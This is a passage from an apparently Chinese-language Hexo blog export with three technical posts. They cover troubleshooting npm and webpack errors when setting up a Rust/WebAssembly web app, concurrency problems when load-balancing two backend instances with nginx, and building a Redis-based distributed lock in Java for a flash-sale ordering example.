<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wasm-pack build</span><br></pre></td></tr></table></figure>

<p>然后进入<code>wasm-test</code>目录下的<code>www</code>目录，使用以下命令创建一个新的 Web 应用程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> www</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm init wasm-app www</span><br></pre></td></tr></table></figure>

<p>结果报错</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm init wasm-app www</span><br><span class="line">npm error could not determine executable to run</span><br><span class="line">npm error A complete <span class="built_in">log</span> of this run can be found <span class="keyword">in</span>: C:\Users\XU Dong\AppData\Local\npm-cache\_logs\2025-03-31T13_22_00_540Z-debug-0.log</span><br></pre></td></tr></table></figure>

<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>在官方仓库的issue发现这是个共性问题，可能是npm版本的问题。</p>
<p>我的npm版本是<code>10.8.2</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm -v</span><br><span class="line">10.8.2</span><br></pre></td></tr></table></figure>

<p>于是我尝试将npm降级到<code>10.7.0</code>版本，使用以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install -g npm@10.7.0</span><br></pre></td></tr></table></figure>

<p>然后重新运行<code>npm init wasm-app www</code>命令，成功创建了新的 Web 应用程序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm init wasm-app www</span><br><span class="line">Need to install the following packages:</span><br><span class="line">create-wasm-app@0.1.0</span><br><span class="line">Ok to proceed? (y) y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; npx</span><br><span class="line">&gt; create-wasm-app www</span><br><span class="line"></span><br><span class="line">🦀 Rust + 🕸 Wasm = ❤</span><br></pre></td></tr></table></figure>

<p>然后在<code>www/package.json</code>添加对应的依赖</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="attr">&quot;homepage&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/rustwasm/create-wasm-app#readme&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;wasm-test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;file:../pkg&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line">  ...</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>同时在<code>www/index.js</code>中的import改为对应project name</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> init, &#123; greet &#125; <span class="keyword">from</span> <span class="string">&quot;wasm-test&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>然后在<code>www</code>目录下运行<code>npm install</code>命令安装依赖。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<h2 id="新的问题"><a href="#新的问题" class="headerlink" title="新的问题"></a>新的问题</h2><p>当运行<code>npm run start</code>命令时，出现了以下错误：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm run start</span><br><span class="line"></span><br><span class="line">&gt; create-wasm-app@0.1.0 start</span><br><span class="line">&gt; webpack-dev-server</span><br><span class="line"></span><br><span class="line">(node:17452) [DEP0111] DeprecationWarning: Access to process.binding(<span class="string">&#x27;http_parser&#x27;</span>) is deprecated.</span><br><span class="line">(Use `node --trace-deprecation ...` to show <span class="built_in">where</span> the warning was created)</span><br><span class="line">i ｢wds｣: Project is running at http://localhost:8080/</span><br><span class="line">i ｢wds｣: webpack output is served from /</span><br><span class="line">i ｢wds｣: Content not from webpack is served from D:\rustproject\wasm-test\www</span><br><span class="line">node:internal/crypto/hash:79</span><br><span class="line">  this[kHandle] = new _Hash(algorithm, xofLen, algorithmId, getHashCache());</span><br><span class="line">                  ^</span><br><span class="line"></span><br><span class="line">Error: error:0308010C:digital envelope routines::unsupported</span><br><span class="line">    at new Hash (node:internal/crypto/hash:79:19)</span><br><span class="line">    at Object.createHash (node:crypto:139:10)</span><br><span class="line">    at module.exports (D:\rustproject\wasm-test\www\node_modules\webpack\lib\util\createHash.js:135:53)</span><br><span class="line">    at NormalModule._initBuildHash (D:\rustproject\wasm-test\www\node_modules\webpack\lib\NormalModule.js:417:16)</span><br><span class="line">    at handleParseError (D:\rustproject\wasm-test\www\node_modules\webpack\lib\NormalModule.js:471:10)</span><br><span class="line">    at D:\rustproject\wasm-test\www\node_modules\webpack\lib\NormalModule.js:503:5</span><br><span class="line">    at D:\rustproject\wasm-test\www\node_modules\webpack\lib\NormalModule.js:358:12</span><br><span class="line">    at D:\rustproject\wasm-test\www\node_modules\loader-runner\lib\LoaderRunner.js:373:3</span><br><span class="line">    at iterateNormalLoaders (D:\rustproject\wasm-test\www\node_modules\loader-runner\lib\LoaderRunner.js:214:10)</span><br><span class="line">    at Array.&lt;anonymous&gt; (D:\rustproject\wasm-test\www\node_modules\loader-runner\lib\LoaderRunner.js:205:4)</span><br><span class="line">    at Storage.finished (D:\rustproject\wasm-test\www\node_modules\enhanced-resolve\lib\CachedInputFileSystem.js:43:16)</span><br><span class="line">    at D:\rustproject\wasm-test\www\node_modules\enhanced-resolve\lib\CachedInputFileSystem.js:79:9</span><br><span class="line">    at D:\rustproject\wasm-test\www\node_modules\graceful-fs\graceful-fs.js:78:16</span><br><span class="line">    at FSReqCallback.readFileAfterClose [as oncomplete] (node:internal/fs/read/context:68:3) &#123;</span><br><span class="line">  opensslErrorStack: [</span><br><span class="line">    <span class="string">&#x27;error:03000086:digital envelope routines::initialization error&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;error:0308010C:digital envelope routines::unsupported&#x27;</span></span><br><span class="line">  ],</span><br><span class="line">  library: <span class="string">&#x27;digital envelope routines&#x27;</span>,</span><br><span class="line">  reason: <span class="string">&#x27;unsupported&#x27;</span>,</span><br><span class="line">  code: <span class="string">&#x27;ERR_OSSL_EVP_UNSUPPORTED&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node.js v23.6.1</span><br></pre></td></tr></table></figure>

<p>于是查看版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm list</span><br><span class="line">create-wasm-app@0.1.0 D:\rustproject\wasm-test\www</span><br><span class="line">├── copy-webpack-plugin@5.1.1</span><br><span class="line">├── hello-wasm-pack@0.1.0</span><br><span class="line">├── wasm-test@npm:pkg@0.1.0 -&gt; .\..\pkg</span><br><span class="line">├── webpack-cli@3.3.12</span><br><span class="line">├── webpack-dev-server@3.11.0</span><br><span class="line">└── webpack@4.43.0</span><br></pre></td></tr></table></figure>

<p>发现是<code>webpack@4.43.0</code>版本的问题。</p>
<p>于是升级</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm uninstall webpack webpack-cli webpack-dev-server copy-webpack-plugin</span><br><span class="line">npm install webpack@5 webpack-cli@4 webpack-dev-server@4 copy-webpack-plugin@10 --save-dev</span><br></pre></td></tr></table></figure>

<p>然后运行<code>npm i</code>和<code>npm run start</code>命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm run start</span><br><span class="line"></span><br><span class="line">&gt; create-wasm-app@0.1.0 start</span><br><span class="line">&gt; webpack-dev-server</span><br><span class="line"></span><br><span class="line">[webpack-cli] Failed to load <span class="string">&#x27;D:\rustproject\wasm-test\www\webpack.config.js&#x27;</span> config</span><br><span class="line">[webpack-cli] Invalid options object. Copy Plugin has been initialized using an options object that does not match the API schema.</span><br><span class="line"> - options[0] should be an object:</span><br><span class="line">   object &#123; patterns, options? &#125;</span><br></pre></td></tr></table></figure>

<p>查看后发现是<code>webpack.config.js</code>文件中的<code>copy-webpack-plugin</code>的配置不符合API要求，升级到高版本后，旧语法会出错</p>
<p>修改对应<code>webpack.config.js</code>文件：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">CopyWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;copy-webpack-plugin&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&quot;./bootstrap.js&quot;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;dist&quot;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bootstrap.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&quot;development&quot;</span>,</span><br><span class="line">  <span class="attr">experiments</span>: &#123;</span><br><span class="line">    <span class="attr">asyncWebAssembly</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">CopyWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">patterns</span>: [</span><br><span class="line">        &#123; <span class="attr">from</span>: <span class="string">&quot;./index.html&quot;</span>, <span class="attr">to</span>: <span class="string">&quot;./&quot;</span> &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>接着运行<code>npm run start</code>命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm run start</span><br><span class="line"></span><br><span class="line">&gt; create-wasm-app@0.1.0 start</span><br><span class="line">&gt; webpack-dev-server</span><br><span class="line"></span><br><span class="line">&lt;i&gt; [webpack-dev-server] Project is running at:</span><br><span class="line">&lt;i&gt; [webpack-dev-server] Loopback: http://localhost:8080/</span><br><span class="line">&lt;i&gt; [webpack-dev-server] On Your Network (IPv4): http://172.27.11.108:8080/</span><br><span class="line">&lt;i&gt; [webpack-dev-server] On Your Network (IPv6): http://[fe80::e1f5:bf6e:7209:b01b]:8080/</span><br><span class="line">&lt;i&gt; [webpack-dev-server] Content not from webpack is served from <span class="string">&#x27;D:\rustproject\wasm-test\www\public&#x27;</span> directory      </span><br><span class="line">assets by path *.js 217 KiB</span><br><span class="line">  asset bootstrap.js 210 KiB [emitted] (name: main)</span><br><span class="line">  asset index_js.bootstrap.js 6.2 KiB [emitted]</span><br><span class="line">asset cf750cde85308290c866.module.wasm 1.41 KiB [emitted] [immutable]</span><br><span class="line">asset index.html 297 bytes [emitted] [from: index.html] [copied]</span><br><span class="line">runtime modules 33.5 KiB 16 modules</span><br><span class="line">modules by path ./ 129 KiB</span><br><span class="line">  modules by path ./node_modules/webpack-dev-server/client/ 71.8 KiB 16 modules</span><br><span class="line">  modules by path ./node_modules/webpack/hot/*.js 5.17 KiB 4 modules</span><br><span class="line">  modules by path ./node_modules/html-entities/dist/esm/*.js 33.5 KiB 4 modules</span><br><span class="line">  modules by path ./*.js 329 bytes</span><br><span class="line">    ./bootstrap.js 279 bytes [built] [code generated]</span><br><span class="line">    ./index.js 50 bytes [built] [code generated]</span><br><span class="line">  ./node_modules/ansi-html-community/index.js 4.16 KiB [built] [code generated]</span><br><span class="line">  ./node_modules/events/events.js 14.5 KiB [built] [code generated]</span><br><span class="line">modules by path ../pkg/ 1.4 KiB (javascript) 1.41 KiB (webassembly)</span><br><span class="line">  ../pkg/wasm_test.js 179 bytes [built] [code generated]</span><br><span class="line">  ../pkg/wasm_test_bg.wasm 70 bytes (javascript) 1.41 KiB (webassembly) [built] [code generated]</span><br><span class="line">  ../pkg/wasm_test_bg.js 1.15 KiB [built] [code generated]</span><br><span class="line">webpack 5.98.0 compiled successfully <span class="keyword">in</span> 2088 ms</span><br></pre></td></tr></table></figure>

<p>成功运行！😘😻</p>
<p>访问<code>http://localhost:8080/</code>，可以看到页面正常显示。</p>
<p><img src="/images/image26.png" alt="alt text"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://rustwasm.github.io/docs/book/game-of-life/hello-world.html">rustwasm</a></p>
]]></content>
      <tags>
        <tag>rust</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式并发安全-引入</title>
    <url>/2025/04/01/%E5%88%86%E5%B8%83%E5%BC%8F%E5%B9%B6%E5%8F%91%E5%AE%89%E5%85%A8-%E5%BC%95%E5%85%A5/</url>
    <content><![CDATA[<h1 id="分布式"><a href="#分布式" class="headerlink" title="分布式"></a>分布式</h1><p><code>分布式/集群</code> 与 <code>单体</code> 不同主要在于并发问题</p>
<h2 id="分布式并发问题"><a href="#分布式并发问题" class="headerlink" title="分布式并发问题"></a>分布式并发问题</h2><p>分布式并发问题主要是指在分布式系统中，由于多个节点之间的并发操作，可能会导致数据不一致、状态不一致等问题。</p>
<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><h3 id="后端设置"><a href="#后端设置" class="headerlink" title="后端设置"></a>后端设置</h3><p>先把application再运行一个</p>
<p>一个运行在8081端口，另一个运行在8082端口</p>
<h3 id="前端设置"><a href="#前端设置" class="headerlink" title="前端设置"></a>前端设置</h3><p>在<code>nginx.conf</code>中设置负载均衡</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="attribute">default_type</span>  application/json;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">8080</span>;</span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line">        <span class="comment"># 指定前端项目所在的位置</span></span><br><span class="line">        <span class="section">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html/hmdp;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="section">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="section">location</span> /api &#123;  </span><br><span class="line">            <span class="attribute">default_type</span>  application/json;</span><br><span class="line">            <span class="comment">#internal;  </span></span><br><span class="line">            <span class="attribute">keepalive_timeout</span>   <span class="number">30s</span>;  </span><br><span class="line">            <span class="attribute">keepalive_requests</span>  <span class="number">1000</span>;  </span><br><span class="line">            <span class="comment">#支持keep-alive  </span></span><br><span class="line">            <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;  </span><br><span class="line">            <span class="attribute">rewrite</span> /api(/.*) <span class="variable">$1</span> <span class="literal">break</span>;  </span><br><span class="line">            <span class="attribute">proxy_pass_request_headers</span> <span class="literal">on</span>;</span><br><span class="line">            <span class="comment">#more_clear_input_headers Accept-Encoding;  </span></span><br><span class="line">            <span class="attribute">proxy_next_upstream</span> <span class="literal">error</span> timeout;  </span><br><span class="line">            <span class="comment"># proxy_pass http://127.0.0.1:8081;</span></span><br><span class="line">            <span class="attribute">proxy_pass</span> http://backend;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 反向代理到后端服务 负载均衡</span></span><br><span class="line">    <span class="section">upstream</span> backend &#123;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8081</span> max_fails=<span class="number">5</span> fail_timeout=<span class="number">10s</span> weight=<span class="number">1</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8082</span> max_fails=<span class="number">5</span> fail_timeout=<span class="number">10s</span> weight=<span class="number">1</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>nginx</code>的反向代理和负载均衡默认使用<code>轮询</code>的方式</p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ol>
<li><p>启动两个后端服务</p>
</li>
<li><p>启动前端服务</p>
</li>
<li><p>打开浏览器，多次访问<code>http://localhost:8080/api/voucher/list/1</code></p>
</li>
<li><p>查看两个后端服务的日志</p>
</li>
</ol>
<p>可以看到请求是交替到两个后端服务的</p>
<h2 id="并发问题"><a href="#并发问题" class="headerlink" title="并发问题"></a>并发问题</h2><p>使用两个相同用户访问<code>http://localhost:8080/api/voucher-order/seckill/7</code>进行秒杀下单时，看到数据库减少了两条数据<br>但是实际上只应该减少一条数据<br>这就是并发问题<br>在分布式系统中，由于多个节点之间的并发操作，可能会导致数据不一致、状态不一致等问题<br>在这个例子中，两个请求同时访问了<code>/api/voucher-order/seckill/7</code>，导致两个请求都成功下单了</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在单体应用中，使用的<code>synchronized</code>关键字来保证线程安全，注意此时单独的<code>jvm</code>，所以锁监视器只有一个，可以监控到哪个线程获取到锁，哪个线程没有获取到锁，保证线程安全</p>
<p><img src="/images/image28.png" alt="alt text"></p>
<p>而在分布式系统中，由于存在多个<code>jvm</code>，所以锁监视器是分开的，在对应的<code>jvm</code>中能够监控到哪个线程获取到锁，哪个线程没有获取到锁，但是在不同的<code>jvm</code>中是无法监控到其他<code>jvm</code>中的线程的，所以在分布式系统中，使用<code>synchronized</code>关键字是无法保证线程安全的</p>
<p><img src="/images/image29.png" alt="alt text"></p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>使用唯一锁监视器来监控全部的<code>jvm</code>中的线程<br>在分布式系统中，使用<code>redis</code>的分布式锁来保证线程安全…</p>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式锁</title>
    <url>/2025/04/01/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/</url>
    <content><![CDATA[<h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><p>满足分布式系统或集群模式下多进程可见并且互斥的锁</p>
<h2 id="常见的分布式锁实现"><a href="#常见的分布式锁实现" class="headerlink" title="常见的分布式锁实现"></a>常见的分布式锁实现</h2><ul>
<li>MySQL</li>
<li>Redis</li>
<li>Zookeeper</li>
<li>etcd<br>…</li>
</ul>
<h2 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h2><table>
<thead>
<tr>
<th>锁类型</th>
<th>互斥</th>
<th>高可用</th>
<th>高性能</th>
<th>安全性</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL</td>
<td>本身的互斥锁机制</td>
<td>好</td>
<td>一般</td>
<td>断开连接，自动释放锁</td>
</tr>
<tr>
<td>Redis</td>
<td>通过 SETNX 实现</td>
<td>好</td>
<td>好</td>
<td>过期时间，自动释放锁</td>
</tr>
<tr>
<td>Zookeeper</td>
<td>节点唯一性与有序性实现互斥</td>
<td>好</td>
<td>一般</td>
<td>临时节点，断开连接，自动释放锁</td>
</tr>
</tbody></table>
<h2 id="Redis-分布式锁"><a href="#Redis-分布式锁" class="headerlink" title="Redis 分布式锁"></a>Redis 分布式锁</h2><ul>
<li>获取锁</li>
</ul>
<p>互斥：确保只能有一个线程获取锁<br>非阻塞：尝试一次，成功返回true，失败则返回false</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加锁 利用 SETNX 的互斥特性</span></span><br><span class="line">SETNX lock_key lock_value</span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加锁过期时间 避免服务器宕机引起的死锁</span></span><br><span class="line">EXPIRE lock_key 10</span><br></pre></td></tr></table></figure>

<p>p.s. 如果添加锁后服务器立刻宕机，没有成功设置过期时间，锁会一直存在，导致死锁</p>
<p>因此需要保证添加锁和设置过期时间是原子操作，可以使用 Redis 的 SET 命令来实现原子操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原子操作 NX是互斥 EX是设置过期时间</span></span><br><span class="line">SET lock_key lock_value NX EX 10</span><br></pre></td></tr></table></figure>

<ul>
<li><p>释放锁</p>
<ul>
<li>手动释放</li>
<li>超时释放：获取锁时添加过期时间</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 释放锁 </span></span><br><span class="line">DEL lock_key</span><br></pre></td></tr></table></figure>

<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ILock.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ILock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 尝试获取锁</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> timeoutSec 锁持有的超时时间，过期自动释放</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true代表获取锁成功</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> timeoutSec)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放锁</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">unLock</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SimpleRedisLock.java</span></span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleRedisLock</span> <span class="keyword">implements</span> <span class="title class_">ILock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleRedisLock</span><span class="params">(String name, StringRedisTemplate stringRedisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.stringRedisTemplate = stringRedisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;lock:&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">tryLock</span><span class="params">(<span class="type">long</span> timeoutSec)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取线程标识</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">threadId</span> <span class="operator">=</span> Thread.currentThread().getId();</span><br><span class="line">        <span class="comment">// 获取锁</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> stringRedisTemplate.opsForValue()</span><br><span class="line">                .setIfAbsent(KEY_PREFIX + name, threadId + <span class="string">&quot;&quot;</span>, timeoutSec, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">return</span> Boolean.TRUE.equals(success); <span class="comment">// 避免自动拆箱出现空指针异常</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 释放锁</span></span><br><span class="line">        stringRedisTemplate.delete(KEY_PREFIX + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改原来的一人一单代码，改为使用分布式锁</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Result <span class="title function_">seckillVoucher</span><span class="params">(Long voucherId)</span> &#123;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建锁对象 锁定用户id (分布式锁)</span></span><br><span class="line">        <span class="type">SimpleRedisLock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleRedisLock</span>(<span class="string">&quot;order:&quot;</span> + userId, stringRedisTemplate);</span><br><span class="line">        <span class="comment">// 获取锁</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isLock</span> <span class="operator">=</span> lock.tryLock(<span class="number">1200</span>);</span><br><span class="line">        <span class="comment">// 判断获取锁是否成功</span></span><br><span class="line">        <span class="keyword">if</span> (!isLock) &#123;</span><br><span class="line">            <span class="comment">// 获取锁失败, 返回错误</span></span><br><span class="line">            <span class="keyword">return</span> Result.fail(<span class="string">&quot;不允许重复下单&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 获取代理对象(事务)</span></span><br><span class="line">            <span class="type">IVoucherOrderService</span> <span class="variable">proxy</span> <span class="operator">=</span> (IVoucherOrderService) AopContext.currentProxy();</span><br><span class="line">            <span class="keyword">return</span> proxy.createVoucherOrder(voucherId);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 释放锁</span></span><br><span class="line">            lock.unLock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//        // 分布式情况下，会有并发问题</span></span><br><span class="line"><span class="comment">//        synchronized (userId.toString().intern()) &#123;</span></span><br><span class="line"><span class="comment">//            // 获取代理对象(事务)</span></span><br><span class="line"><span class="comment">//            IVoucherOrderService proxy = (IVoucherOrderService) AopContext.currentProxy();</span></span><br><span class="line"><span class="comment">//            // 如果不获取代理对象，会调用this.func导致事务失效</span></span><br><span class="line"><span class="comment">//            // 因为spring通过代理模式来实现事务，如果直接调用this.func，那么就不会走代理，导致事务失效</span></span><br><span class="line"><span class="comment">//            return proxy.createVoucherOrder(voucherId);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="新的问题"><a href="#新的问题" class="headerlink" title="新的问题"></a>新的问题</h2><p>如果一个线程获取锁后，执行了很长时间，导致锁过期了，那么其他线程就会获取到锁，导致误删其他锁，引发数据不一致，这就是<strong>业务堵塞</strong>导致锁过期的问题。</p>
<p>解决方案：</p>
<ol>
<li><p>在获取锁时存入线程标识(可以用UUID)，因为不同的jvm可能会存在相同的线程标识，需要进一步区分，以保证全局唯一性</p>
</li>
<li><p>在释放锁时，判断当前线程标识是否和锁中的线程标识一致，如果一致则释放锁，否则不释放锁</p>
</li>
</ol>
<p>实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cn.hutool.core.lang.UUID;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleRedisLock</span> <span class="keyword">implements</span> <span class="title class_">ILock</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> StringRedisTemplate stringRedisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleRedisLock</span><span class="params">(String name, StringRedisTemplate stringRedisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.stringRedisTemplate = stringRedisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">KEY_PREFIX</span> <span class="operator">=</span> <span class="string">&quot;lock:&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ID_PREFIX</span> <span class="operator">=</span> UUID.randomUUID().toString(<span class="literal">true</span>) + <span class="string">&quot;-&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span 